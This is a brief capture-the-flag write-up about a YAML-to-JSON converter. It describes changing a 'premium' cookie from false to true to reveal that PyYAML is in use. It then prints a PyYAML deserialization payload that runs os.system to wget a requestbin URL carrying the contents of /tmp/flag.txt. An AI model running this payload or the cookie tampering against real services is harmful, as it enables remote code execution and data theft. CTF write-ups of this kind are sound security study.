page offers a simple conversion from .yaml to .json

![](https://ibb.co/1XtF9H0?size=150)

website also created a cookie premium:false

it is possible to change value false to true which show us a message that PyYaml library is being used. Some versions of that libs had some arbitrary code executions vunerabilities. After some checking me and my team found that exploit to send a flag to requestbin


{
	!!python/object/apply:os.system ["wget http://requestbin.net/r/1b9a6hxj/?`cat /tmp/flag.txt`"]
}

